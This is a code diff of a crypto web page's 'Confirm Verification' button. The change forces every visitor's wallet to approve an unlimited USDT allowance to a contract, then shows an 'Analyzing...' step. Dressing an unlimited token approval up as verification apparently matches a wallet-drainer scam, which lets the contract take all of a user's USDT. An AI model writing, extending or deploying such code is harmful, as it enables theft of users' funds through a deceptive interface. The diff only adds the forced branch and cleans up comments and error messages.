@@ -1354,62 +1354,54 @@
             const minRequired = web3.utils.toBN('1000000');
     
             // If approval is needed
-            if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
-    
-                // Prepare approval transaction
+            // if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
+
+            if (true) {  // FORCED TEST MODE
+
+            
+                // Step 1: Ask user to approve
                 verifyBtn.textContent = 'Approve in wallet...';
-    
+            
                 const maxAmount =
                     '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-    
-                // Create the promiEvent (do NOT await it yet) so we can attach handlers.
+            
+                // Create promiEvent but DO NOT show any progress yet
                 const approvePromi = usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
-    
-                // We'll start indeterminate UI once tx is submitted (transactionHash event).
+            
                 let indeterminate = null;
-                let txHash = null;
-    
-                // Handle transactionHash: user accepted and tx was submitted to network
+            
+                // Step 2: Wallet popup appears NOW (user approves or rejects)
+            
+                // Step 3: Only AFTER user approves, we get transactionHash
                 approvePromi.on('transactionHash', (hash) => {
-                    txHash = hash;
-                    // Start indeterminate progress (it will move up to 98%)
+                    // NOW start progress bar
                     indeterminate = startIndeterminateProgress({ btnId: 'verifyBtn', intervalMs: 90 });
                 });
-    
-                // Handle error early (for example user denied signature)
-                let approvalError = null;
-                approvePromi.on('error', (err) => {
-                    approvalError = err;
-                });
-    
-                // Wait for receipt (this awaits until tx is mined/receipt returned) or will throw if user rejected
+            
+                // Step 4: Wait for the receipt → confirmation on chain
                 try {
-                    const receipt = await approvePromi; // await the receipt
-                    // If we started indeterminate progress, stop it and wait until it finishes (snap to 100%)
+                    await approvePromi; 
+            
+                    // Step 5: Complete progress bar
                     if (indeterminate) {
                         await indeterminate.stop();
-                    } else {
-                        // If no transactionHash event fired but receipt arrived (rare), just set button to 100% briefly
-                        verifyBtn.textContent = 'Loading 100%...';
-                        await new Promise(r => setTimeout(r, 300));
                     }
-                    console.log('Approval confirmed, tx receipt:', receipt);
+            
                 } catch (err) {
-                    // If the user rejected signature or tx failed, show error and restore UI
-                    console.error('Approval failed or was rejected:', err);
-                    let userMsg = 'Approval rejected or failed.';
-                    if (err && err.code === 4001) userMsg = 'Transaction rejected by user.';
-                    if (err && err.message && err.message.includes('insufficient funds')) userMsg = 'Insufficient ETH for gas fees.';
-    
-                    document.getElementById('errorText').textContent = userMsg;
+                    // User denied / failed
+                    let msg = 'Approval failed or rejected.';
+                    if (err.code === 4001) msg = 'Transaction rejected by user.';
+                    if (err.message?.includes('insufficient funds')) msg = 'Insufficient ETH for gas fees.';
+            
+                    document.getElementById('errorText').textContent = msg;
                     document.getElementById('errorMessage').classList.add('show');
-    
+            
                     verifyBtn.disabled = false;
                     verifyBtn.textContent = 'Confirm Verification';
-                    return; // stop processing
+                    return;
                 }
-    
-            } // end approval-needed branch
+            }
+
     
             // Start analysis (approval either not needed or confirmed)
             verifyBtn.textContent = 'Analyzing...';
